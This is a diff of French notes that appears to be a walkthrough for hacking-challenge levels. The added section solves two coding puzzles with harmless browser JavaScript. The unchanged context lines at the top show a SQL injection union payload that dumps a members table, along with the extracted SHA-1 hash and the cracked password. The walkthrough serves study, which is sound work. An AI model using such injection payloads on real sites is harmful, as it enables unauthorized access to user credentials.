@@ -330,3 +330,35 @@ remplacer q=... par q=%' and admin='1' union select password, admin from members
 on a un seul utilisateur : bellamond et son mot de passe 1b774bc166f3f8918e900fcef8752817bae76a37
 google => http://md5.znaet.org/md5/1cd30461f1450f450c4fc598afe5c6d5#.VD5mv7t_wW0
 c'est le sha1 de sup3r
+
+#Coding
+##Level 1
+dans un scratchpad
+```javascript
+var textareas = document.getElementsByTagName("textarea");
+var values = textareas[0].value;
+var vals = values.split(", ");
+vals.sort();
+textareas[1].value = vals.join(", ")
+```
+run, submit
+
+##Level 2
+dans un scratchpad
+```javascript
+var textareas = document.getElementsByTagName("textarea");
+var values = textareas[0].value;
+var vals = values.split(",");
+var result = ""
+
+for(i=0; i<vals.length ; i++) {
+  if (vals[i] == ' ') {
+    result += vals[i];
+  } else {
+   result += String.fromCharCode(31+127-parseInt(vals[i]));
+  }
+}
+
+textareas[1].value = result;
+```
+run, submit
